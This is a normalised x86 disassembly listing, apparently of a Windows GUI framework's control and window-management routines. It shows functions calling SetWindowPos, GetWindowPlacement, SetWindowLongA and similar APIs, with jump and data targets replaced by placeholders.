mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f658
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44f720
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_460ae8
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403350
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44f720
test al al
jne r-xdata
sub_44f784
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f720
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44f7a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44d44c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44d410
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_44afd4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44f7a4
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_44f854
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_44f7a4
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_460ae8
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_44afd4
test eax eax
jne r-xdata
sub_44f8fc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44e39c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44f91c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44e39c
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44f950
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44e39c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44f970
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_44f9c0
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_44f9e4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_4490ec
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_44d44c
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_44d410
mov dl [ esp ]
mov si 0xffd1
call sub_403350
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_44fa3c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403350
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_44fa60
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403350
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_44fa98
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44baa8
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_44d4ac
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_44dcbc
sub_44fad0
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403350
pop esi
pop ebx
retn
mov eax ebx
call sub_44a464
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_404410
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_404410
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_44fb50
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e09c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44bb7c
sub_44fbb0
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_44de10
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_44d20c
pop ebx
retn
sub_44fbe0
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_44fc08
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_450a20
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_44d20c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_44fc78
push ebx
mov ebx eax
mov eax ebx
call sub_44b9e8
mov eax ebx
call sub_450a20
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_44d4ac
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_42403c
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_44afd4
sub_44fcb4
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_4486cc
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_45071c
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_44afd4
sub_44fcf4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_450a20
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_45071c
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44fd34
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_44d4ac
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_450a20
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_450624
sub_44fd74
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_45085c
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_45085c
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_44fdd4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_44aa30
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_449964
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_44e008
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_44fe44
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44bb20
mov edx esi
mov eax ebx
call sub_44d46c
pop esi
pop ebx
retn
sub_44fe60
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_446d5c
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_460ae8
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403350
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403350
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403350
test al al
jne r-xdata
sub_44fef4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_451844
mov edx esi
mov eax ebx
call sub_44fe60
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_44afd4
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_44afd4
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_44afd4
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_460ae8
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_44afd4
test eax eax
jne r-xdata
jmp r-xdata
sub_44ffd8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_44afd4
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_45002c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_44afd4
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_460ae8
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_44afd4
test eax eax
jne r-xdata
sub_450078
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_44fe60
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_44afd4
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_460ae8
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_44afd4
test eax eax
jne r-xdata
sub_4500d4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_460ae8
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_44afd4
mov [ esi + 0xc ] eax
sub_450108
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_450a20
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_450a20
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_449474
mov eax ebx
mov si 0xffd0
call sub_403350
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_4497c0
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4501e0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_44d44c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_44d410
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403350
inc edi
dec ebx
jne r-xdata
sub_450228
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44cfb4
xor eax eax
push ebp
push sub_4502c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4501e0
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_449a3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4502cd
mov eax [ ebp - 0x4 ]
call sub_44cfbc
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_4502d4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_44d44c
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_44cfdc
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_44d410
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_4503c4
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_41860c
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_4184a0
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_41862c
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_4185b0
call sub_45071c
jmp r-xdata
mov eax ebp
mov edx esi
call sub_4185b0
call sub_45071c
sub_45049c
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_4503c4
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_4504fc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_45071c
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_45071c
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
test eax eax
jne r-xdata
sub_450560
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_450a20
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_44afd4
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_43dfe8
call sub_43e0c8
test al al
je r-xdata
mov eax ebx
call sub_44d44c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_44d410
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_44d410
test [ eax + 0x52 ] 0x4
je r-xdata
sub_450624
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_4497c0
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_45065c
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_460ae8
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_45069c
push ebx
mov ebx eax
mov eax ebx
call sub_460ae8
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_464854
pop ebx
retn
mov eax ebx
call sub_460b10
mov eax ebx
call sub_45071c
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_4506d4
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4506f8
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_4506f8
sub_450730
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_416f24
mov eax edi
call sub_44d44c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_44d410
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_4507c4
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_45071c
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_4507fc
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_450a20
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_45071c
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403350
sub_4508b8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_41860c
pop esi
pop ebx
retn
sub_4508dc
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_4508b8
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_4184a0
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_41862c
sub_450950
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_450a20
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_44afd4
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_4509b0
push ebp
mov ebp esp
push 0x0
